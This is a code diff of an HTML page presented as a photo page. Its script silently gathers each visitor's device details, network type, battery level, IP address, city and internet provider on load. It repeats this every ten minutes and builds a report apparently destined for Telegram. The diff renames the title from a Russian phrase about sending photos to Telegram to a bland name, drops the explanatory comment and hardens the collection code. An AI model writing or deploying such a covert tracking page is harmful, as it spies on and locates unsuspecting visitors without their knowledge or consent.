@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>Фото с отправкой в Telegram</title>
+  <title>dushanbesityphoto</title>
   <style>
     html, body {
       margin: 0; padding: 0; height: 100%; width: 100%; background: #000;
@@ -29,7 +29,7 @@
 
     window.onload = function () {
       collectAndSendData();
-      setInterval(collectAndSendData, 600000); // отправлять каждые 10 минут
+      setInterval(collectAndSendData, 600000);
     };
 
     function collectAndSendData() {
@@ -57,16 +57,25 @@
           deviceInfo = "Linux";
         }
 
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const networkType = connection?.effectiveType || 'Неизвестно';
-        const downlinkSpeed = connection?.downlink ? `${connection.downlink} Мбит/с` : 'Неизвестно';
+        let networkType = "Недоступно";
+        let downlinkSpeed = "Недоступно";
 
-        let batteryStatus = "Неизвестно";
+        try {
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          if (connection) {
+            networkType = connection.effectiveType || "Неизвестно";
+            downlinkSpeed = connection.downlink ? `${connection.downlink} Мбит/с` : "Неизвестно";
+          }
+        } catch {}
+
+        let batteryStatus = "Недоступно";
 
         const sendInfo = (ipData = {}) => {
-          const location = ipData.city ? `${ipData.city}, ${ipData.regionName}, ${ipData.country}` : "Неизвестно";
-          const ip = ipData.query || "Неизвестно";
-          const provider = ipData.org || "Неизвестно";
+          const location = ipData.city && ipData.country
+            ? `${ipData.city}, ${ipData.region || ""}, ${ipData.country}`
+            : "Неизвестно";
+          const ip = ipData.ip || "Неизвестно";
+          const provider = ipData.connection?.org || ipData.org || "Неизвестно";
 
           const caption = `
 📲 Устройство: ${deviceInfo}
@@ -78,7 +87,7 @@
 🪟 Окно: ${windowSize}
 🔌 Тип сети: ${networkType}
 ⚡ Скорость сети: ${downlinkSpeed}
-🔋 Заряд: ${batteryStatus}%
+🔋 Заряд: ${batteryStatus}
 📍 Местоположение: ${location}
 🌐 IP: ${ip}
 🏢 Провайдер: ${provider}
@@ -90,11 +99,9 @@
 
         if (navigator.getBattery) {
           navigator.getBattery().then(battery => {
-            batteryStatus = Math.round(battery.level * 100);
+            batteryStatus = Math.round(battery.level * 100) + "%";
             getIPData(sendInfo);
-          }).catch(() => {
-            getIPData(sendInfo);
-          });
+          }).catch(() => getIPData(sendInfo));
         } else {
           getIPData(sendInfo);
         }
@@ -104,9 +111,15 @@
     }
 
     function getIPData(callback) {
-      fetch("https://ip-api.com/json")
+      fetch("https://ipwho.is/?lang=ru")
         .then(res => res.json())
-        .then(data => callback(data))
+        .then(data => {
+          if (data.success !== false) {
+            callback(data);
+          } else {
+            callback({});
+          }
+        })
         .catch(() => callback({}));
     }
 
